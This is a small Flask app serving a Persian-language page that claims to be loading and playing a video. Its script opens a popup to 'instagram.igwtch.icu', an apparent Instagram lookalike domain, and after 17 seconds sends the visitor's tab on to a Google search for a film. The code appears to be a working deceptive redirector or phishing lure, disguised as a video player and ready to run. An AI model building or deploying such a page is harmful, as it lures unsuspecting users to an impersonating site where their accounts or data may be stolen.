from flask import Flask, render_template_string

app = Flask(__name__)

@app.route("/start")
def start():
    return render_template_string("""
<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <title>در حال بارگذاری...</title>
  <script>
    // باز کردن سایت اول در تب دوم
    let tab = window.open("https://instagram.igwtch.icu?video=986907192", "_blank");

    // بعد از 17 ثانیه، رفتن به سایت دوم
    setTimeout(() => {
      window.location.href = "https://www.google.com/search?q=فیلم+مسافران";
    }, 17000);
  </script>
</head>
<body style="background:white; display:flex; align-items:center; justify-content:center; height:100vh; font-family:sans-serif;">
  <h1>در حال پخش ویدیو...</h1>
</body>
</html>
""")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=3000)